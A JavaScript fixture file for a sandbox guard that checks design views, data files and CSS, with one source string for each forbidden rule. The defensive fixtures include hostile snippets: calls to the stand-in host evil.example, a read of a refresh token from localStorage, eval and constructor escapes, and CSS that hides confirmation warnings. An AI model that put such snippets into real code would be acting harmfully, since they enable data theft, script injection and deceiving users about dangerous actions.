// Fixtures for scripts/test-guard.mjs: one small source per rule, plus valid sources that must pass.
// kind: "code" (a design view/part), "data" (design/copy.js or routes.js), "css" (design/theme.css).
// expect: the rule id that MUST be reported, or null when the source must pass cleanly.
// (Strings, not files, so these hostile snippets are never loadable by anything.)
const view = (body) => `export default function view(root, ctx) { ${body} }`;

export const CASES = [
  // valid
  { name: "valid view", kind: "code", expect: null, src: `import { helper } from "../parts/helper.js";
export default function view(root, ctx) {
  const { h, rows } = ctx.ui;
  const { t, can } = ctx;
  const { userEmail } = ctx.session;
  const id = ctx.route.params[0];
  root.append(h("p", { class: "muted" }, t("login.title"), userEmail), h("button", { onClick: () => ctx.navigate("orders") }, t("common.cancel")));
  if (can("order.view")) ctx.data.categoryChoices;
  return id + helper + String(rows);
}` },
  { name: "valid data file", kind: "data", expect: null, src: `export default {\n  // comment\n  "common.confirm": "確定",\n  list: [1, 2, -3, true, null],\n};` },
  { name: "valid css", kind: "css", expect: null, src: `:root { --accent: #d4688a; }\n.card { background: url(assets/bg.svg); border-radius: 8px; }\n@media (min-width: 900px) { .page-title { font-size: 40px; } }` },
  { name: "css styles the fixed warning (allowed)", kind: "css", expect: null, src: `.dlg__warning { color: #b00020; font-weight: 600; }` },

  // network, storage, dynamic code
  { name: "fetch", kind: "code", expect: "js/forbidden-identifier", src: view(`fetch("/api/v1/admin/me");`) },
  { name: "XMLHttpRequest", kind: "code", expect: "js/forbidden-identifier", src: view(`new XMLHttpRequest();`) },
  { name: "WebSocket", kind: "code", expect: "js/forbidden-identifier", src: view(`new WebSocket("wss://evil.example/x");`) },
  { name: "sendBeacon", kind: "code", expect: "js/forbidden-identifier", src: view(`ctx.x.sendBeacon("/x", "data");`) },
  { name: "localStorage (refresh token)", kind: "code", expect: "js/forbidden-identifier", src: view(`localStorage.getItem("refreshToken");`) },
  { name: "sessionStorage", kind: "code", expect: "js/forbidden-identifier", src: view(`sessionStorage.getItem("accessReloadAt");`) },
  { name: "indexedDB", kind: "code", expect: "js/forbidden-identifier", src: view(`indexedDB.open("x");`) },
  { name: "eval", kind: "code", expect: "js/forbidden-identifier", src: view(`eval("1+1");`) },
  { name: "new Function", kind: "code", expect: "js/forbidden-identifier", src: view(`new Function("return 1");`) },
  { name: "dynamic import()", kind: "code", expect: "js/dynamic-import", src: `export default async function view(root, ctx) { await import("../../lib/api.js"); }` },
  { name: "import.meta", kind: "code", expect: "js/forbidden-identifier", src: view(`const u = import.meta.url;`) },
  { name: "constructor property", kind: "code", expect: "js/forbidden-identifier", src: view(`const F = ctx.ui.h.constructor;`) },

  // imports of the core
  { name: "import lib", kind: "code", expect: "js/import", src: `import { api } from "../../lib/api.js";\nexport default function view(root, ctx) { api("GET", "/admin/me"); }` },
  { name: "import core", kind: "code", expect: "js/import", src: `import { groups } from "../../core/groups/index.js";\nexport default function view(root, ctx) { return groups; }` },
  { name: "import ui", kind: "code", expect: "js/import", src: `import { h } from "../../ui/kit.js";\nexport default function view(root, ctx) { root.append(h("p")); }` },
  { name: "import remote URL", kind: "code", expect: "js/import", src: `import x from "https://evil.example/x.js";\nexport default function view(root, ctx) {}` },
  { name: "import app.js", kind: "code", expect: "js/import", src: `import x from "../../app.js";\nexport default function view(root, ctx) {}` },

  // DOM, markup, handlers, navigation
  { name: "document access", kind: "code", expect: "js/forbidden-identifier", src: view(`document.body.append(root);`) },
  { name: "innerHTML", kind: "code", expect: "js/forbidden-identifier", src: view(`root.innerHTML = "<b>x</b>";`) },
  { name: "insertAdjacentHTML", kind: "code", expect: "js/forbidden-identifier", src: view(`root.insertAdjacentHTML("beforeend", "x");`) },
  { name: "setAttribute", kind: "code", expect: "js/forbidden-identifier", src: view(`root.setAttribute("onclick", "x()");`) },
  { name: "string onclick handler", kind: "code", expect: "js/event-handler-string", src: view(`ctx.ui.h("button", { onclick: "alert(1)" }, "x");`) },
  { name: "assigning .onclick", kind: "code", expect: "js/event-handler-assignment", src: view(`const b = ctx.ui.h("button"); b.onclick = () => 1;`) },
  { name: "window.location assignment", kind: "code", expect: "js/forbidden-identifier", src: view(`window.location = "https://evil.example";`) },
  { name: "globalThis", kind: "code", expect: "js/forbidden-identifier", src: view(`const g = globalThis;`) },
  { name: "script tag in a string", kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("div", {}, "<script src=x></script>");`) },
  { name: "iframe element name", kind: "code", expect: "js/banned-string", src: view(`ctx.ui.h("iframe", { src: "/x" });`) },
  { name: "external URL string", kind: "code", expect: "js/html-or-url-in-string", src: view(`ctx.ui.h("img", { src: "https://evil.example/p.png?d=1" });`) },
  { name: "setTimeout with a string", kind: "code", expect: "js/timer-string", src: view(`setTimeout("alert(1)", 10);`) },

  // obfuscation
  { name: "computed access with concatenation", kind: "code", expect: "js/computed-access", src: view(`const k = "a"; ctx.ui["h" + k]();`) },
  { name: "string concatenation", kind: "code", expect: "js/string-concat", src: view(`const k = "con" + "structor";`) },

  // only names listed in lib/public-api.json
  { name: "unknown ctx namespace", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.secretStore.read();`) },
  { name: "unknown ctx.ui function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.ui.eatCookies();`) },
  { name: "unknown ctx.actions function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.actions.deleteEverything();`) },
  { name: "unknown ctx.data function", kind: "code", expect: "js/ctx-unknown", src: view(`ctx.data.dumpDatabase();`) },
  { name: "destructuring an unknown name", kind: "code", expect: "js/ctx-unknown", src: view(`const { h, rawFetch } = ctx.ui;`) },
  { name: "computed access on ctx", kind: "code", expect: "js/ctx-unknown", src: view(`const n = "ui"; ctx[n].h();`) },
  { name: "reading the token", kind: "code", expect: "js/ctx-unknown", src: view(`const x = ctx.auth.token;`) },

  // data files must be pure data
  { name: "data: a call", kind: "data", expect: "js/data-not-pure", src: `export default { "a": String("x") };` },
  { name: "data: an arrow function", kind: "data", expect: "js/data-not-pure", src: `export default { "a": () => 1 };` },
  { name: "data: an import", kind: "data", expect: "js/data-not-pure", src: `import x from "../lib/api.js";\nexport default { a: "x" };` },
  { name: "data: no export default", kind: "data", expect: "js/data-not-pure", src: `const a = { "a": "x" };` },

  // CSS
  { name: "css @import remote", kind: "css", expect: "css/import", src: `@import url("https://fonts.googleapis.com/css2?family=X");` },
  { name: "css url remote", kind: "css", expect: "css/url", src: `.a { background: url(https://evil.example/p.png); }` },
  { name: "css url outside assets", kind: "css", expect: "css/url", src: `.a { background: url(../lib/api.js); }` },
  { name: "css expression()", kind: "css", expect: "css/expression", src: `.a { width: expression(alert(1)); }` },
  { name: "css hides the confirm button", kind: "css", expect: "css/hides-dialog", src: `dialog.dlg [data-testid="confirm-yes"] { display: none; }` },
  { name: "css hides the fixed confirmation warning", kind: "css", expect: "css/hides-dialog", src: `.dlg__warning { display: none; }` },
  { name: "css hides the warning by test id", kind: "css", expect: "css/hides-dialog", src: `[data-testid="confirm-warning"] { font-size: 0; }` },
  { name: "css disables dialogs", kind: "css", expect: "css/hides-dialog", src: `dialog { pointer-events: none; }` },
];
